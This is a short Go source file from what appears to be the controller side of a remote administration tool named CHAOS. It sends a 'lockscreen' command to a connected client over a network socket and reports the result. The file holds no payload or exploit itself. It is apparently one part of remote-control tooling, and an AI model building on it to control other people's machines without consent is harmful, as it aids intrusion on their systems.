package lock_screen

import (
	"fmt"
	log "github.com/sirupsen/logrus"
	"github.com/tiagorlampert/CHAOS/internal/models"
	"github.com/tiagorlampert/CHAOS/internal/usecase"
	"github.com/tiagorlampert/CHAOS/internal/util/network"
	"github.com/tiagorlampert/CHAOS/pkg/color"
	"net"
)

type LockScreenUseCase struct {
	Connection net.Conn
}

func NewLockScreenUseCase(conn net.Conn) usecase.LockScreen {
	return &LockScreenUseCase{
		Connection: conn,
	}
}

func (l LockScreenUseCase) Lock() error {
	fmt.Println(color.Green, "[*] Locking the screen...")

	if err := network.Send(l.Connection, models.Message{
		Command: "lockscreen",
	}); err != nil {
		log.WithField("cause", err.Error()).Error(usecase.ErrSendingRequest)
		return err
	}

	response, err := network.Read(l.Connection)
	if err != nil {
		log.WithField("cause", err.Error()).Error(usecase.ErrReadingResponse)
		return err
	}
	if response.Error.HasError {
		return fmt.Errorf(response.Error.Message)
	}
	fmt.Println(color.Green, "[*] Screen locked successfully!")
	return nil
}
